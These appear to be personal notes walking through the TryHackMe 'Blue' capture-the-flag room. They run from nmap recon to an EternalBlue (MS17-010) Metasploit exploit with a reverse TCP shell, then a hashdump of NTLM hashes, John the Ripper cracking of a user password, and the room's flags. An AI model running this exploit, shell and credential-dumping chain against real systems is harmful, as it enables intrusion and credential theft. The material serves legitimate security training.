---
tags:
  - windows
  - tryhackme
---
Got IP target 10.10.55.49

# Recon
nmap -p- 10.10.55.49 -oN blue-nmap-ports

Nmap scan report for 10.10.55.49
Host is up (0.054s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
# Nmap 7.94 scan initiated Sun Oct 29 03:58:57 2023 as: 
nmap -sC -sV --script vuln -p135,139,445,3389,49152,49153,49154,49158,49159 --open -oN blue-nmap-deep1 10.10.55.49
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.55.49
Host is up (0.055s latency).

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sun Oct 29 04:02:00 2023 -- 1 IP address (1 host up) scanned in 183.82 seconds

# Weaponization
Exploit payload of ms17-010

msfconsole

msf6 > search ms17-010


Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Chose 0 for name Blue room
set payload windows/x64/shell/reverse_tcp
	Since it's windows
hostname -I
	10.18.39.123
set LHOST 10.18.39.123
set RHOST 10.10.55.49

Tip can just type `options` rather than `show options`
# Delivery

run
meterpreter > sysinfo
	Computer        : JON-PC
	OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
	Architecture    : x64
	System Language : en_US
	Domain          : WORKGROUP
	Logged On Users : 0
	Meterpreter     : x64/windows

# Priv Esc

_post/multi/manage/shell_to_meterpreter_

or just type session --upgrade 1 
	Or whatever number session you want to upgrade

meterpreter > getsystem 
	[-] Already running as SYSTEM

meterpreter > hashdump
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

`john --format=nt hashes --wordlist=/usr/share/wordlists/rockyou.txt`
	Using default input encoding: UTF-8
	Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
	Remaining 1 password hash
	Warning: no OpenMP support for this hash type, consider --fork=8
	Press 'q' or Ctrl-C to abort, almost any other key for status
	**alqfna22**         (Jon)     
	1g 0:00:00:01 DONE (2023-10-29 04:34) 0.6711g/s 6845Kp/s 6845Kc/s 6845KC/s alr19882006..alpusidi
	Warning: passwords printed above might not be all those cracked
	Use the "--show --format=NT" options to display all of the cracked passwords reliably
	Session completed.

# Flag 1 (Root Directory)
meterpreter > pwd
C:\Windows\system32
meterpreter > cd ../..
meterpreter > pwd
C:\
meterpreter > ls
	Listing: C:\
	Mode              Size   Type  Last modified              Name
	----              ----   ----  -------------              ----
	040777/rwxrwxrwx  0      dir   2018-12-13 03:13:36 +0000  $Recycle.Bin
	040777/rwxrwxrwx  0      dir   2009-07-14 05:08:56 +0000  Documents and Settings
	040777/rwxrwxrwx  0      dir   2009-07-14 03:20:08 +0000  PerfLogs
	040555/r-xr-xr-x  4096   dir   2019-03-17 22:22:01 +0000  Program Files
	040555/r-xr-xr-x  4096   dir   2019-03-17 22:28:38 +0000  Program Files (x86)
	040777/rwxrwxrwx  4096   dir   2019-03-17 22:35:57 +0000  ProgramData
	040777/rwxrwxrwx  0      dir   2018-12-13 03:13:22 +0000  Recovery
	040777/rwxrwxrwx  4096   dir   2023-10-29 04:20:39 +0000  System Volume Information
	040555/r-xr-xr-x  4096   dir   2018-12-13 03:13:28 +0000  Users
	040777/rwxrwxrwx  16384  dir   2019-03-17 22:36:30 +0000  Windows
	100666/rw-rw-rw-  24     fil   2019-03-17 19:27:21 +0000  flag1.txt
	000000/---------  0      fif   1970-01-01 00:00:00 +0000  hiberfil.sys
	000000/---------  0      fif   1970-01-01 00:00:00 +0000  pagefile.sys
meterpreter > cat flag1.txt 
`flag{access_the_machine}`

# Flag 2 (Local Passwords Stored)
meterpreter > pwd
C:\Windows\System32\config
meterpreter > cat flag2.txt 
flag{sam_database_elevated_access}

# Flag 3 (Admin Data Store Area)
meterpreter > pwd
C:\Users\Jon\Documents
meterpreter > cat flag3.txt 
flag{admin_documents_can_be_valuable}